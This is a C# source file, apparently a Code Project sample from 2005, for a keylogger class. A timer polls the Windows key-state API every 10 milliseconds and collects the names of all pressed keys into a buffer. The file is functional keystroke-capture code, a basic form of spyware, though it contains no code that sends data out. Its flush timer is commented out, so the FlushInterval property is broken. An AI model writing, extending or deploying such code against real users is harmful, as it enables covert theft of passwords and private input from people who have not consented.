/*
 *	ArticleKeyLog - Basic Keystroke Mining
 *
 *	Date:	05/12/2005
 *
 *	Author:	Alexander Kent
 *
 *	Description:	Sample Application for the Code Project (www.codeproject.com)
 */

using System;
using System.IO;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace ServerDLL
{
	/// <summary>
	/// Summary description for Keylogger
	/// 
	/// Timer Intervals are in ms, examples:
	///	60000ms = 1 minute
	///	1800000ms = 30 minutes
	/// 36000000ms = 60 minutes
	/// 
	/// </summary>
	/// 	
    internal class Keylogger
	{
		/// <summary>
		/// The GetAsyncKeyState function determines whether a key is up or down at the time 
		/// the function is called, and whether the key was pressed after a previous call 
		/// to GetAsyncKeyState.
		/// </summary>
		/// <param name="vKey">Specifies one of 256 possible virtual-key codes. </param>
		/// <returns>If the function succeeds, the return value specifies whether the key 
		/// was pressed since the last call to GetAsyncKeyState, and whether the key is 
		/// currently up or down. If the most significant bit is set, the key is down, 
		/// and if the least significant bit is set, the key was pressed after 
		/// the previous call to GetAsyncKeyState. </returns>
		[DllImport("User32.dll")]
		private static extern short GetAsyncKeyState(
			System.Windows.Forms.Keys vKey); // Keys enumeration

		[DllImport("User32.dll")]
		private static extern short GetAsyncKeyState(
			System.Int32 vKey); 


		[DllImport("User32.dll")]
		private static extern short GetKeyState(  int nVirtKey
			);

        private System.String keyBuffer;

        public System.String KeyBuffer
        {
            get { return keyBuffer; }
            set { keyBuffer = value; }
        }

      
		private System.Timers.Timer timerKeyMine;
		private System.Timers.Timer timerBufferFlush;

		public Keylogger()
		{
			//
			// keyBuffer
			//
			keyBuffer = "";

			// 
			// timerKeyMine
			// 
			this.timerKeyMine = new System.Timers.Timer();
			this.timerKeyMine.Enabled = true;
			this.timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(this.timerKeyMine_Elapsed);
			this.timerKeyMine.Interval = 10;
			
			// 
			// timerBufferFlush
			//
			//this.timerBufferFlush = new System.Timers.Timer();
			//this.timerBufferFlush.Enabled = true;
			//this.timerBufferFlush.Elapsed += new System.Timers.ElapsedEventHandler(this.timerBufferFlush_Elapsed);
			//this.timerBufferFlush.Interval = 12000; // 30 minutes
		}

		/// <summary>
		/// Itrerating thru the entire Keys enumeration; downed key names are stored in keyBuffer 
		/// (space delimited).
		/// </summary>
		/// <param name="sender"></param>
		/// <param name="e"></param>
		private void timerKeyMine_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
		{
	
			foreach(System.Int32 i in Enum.GetValues(typeof(Keys)))
			{
				if(GetAsyncKeyState(i) == -32767)
				{	
					
					if(i !=16 && i !=160 && i !=161 && i!=1 && i!=2)
					{
						if( GetKeyState(16) == -127 || GetKeyState(16) == -128 )
							keyBuffer +="S";
			
						keyBuffer += Enum.GetName(typeof(Keys), i) + " ";
					
					
					}
					
				}
			}
		}
	
		
	

		#region Properties
		public System.Boolean Enabled
		{
			get
			{
				return timerKeyMine.Enabled ;
			}
			set
			{
				timerKeyMine.Enabled = value;
			}
		}

		public System.Double FlushInterval
		{
			get
			{
				return timerBufferFlush.Interval;
			}
			set
			{
				timerBufferFlush.Interval = value;
			}
		}

		public System.Double MineInterval
		{
			get
			{
				return timerKeyMine.Interval;
			}
			set
			{
				timerKeyMine.Interval = value;
			}
		}
		#endregion

	}
}
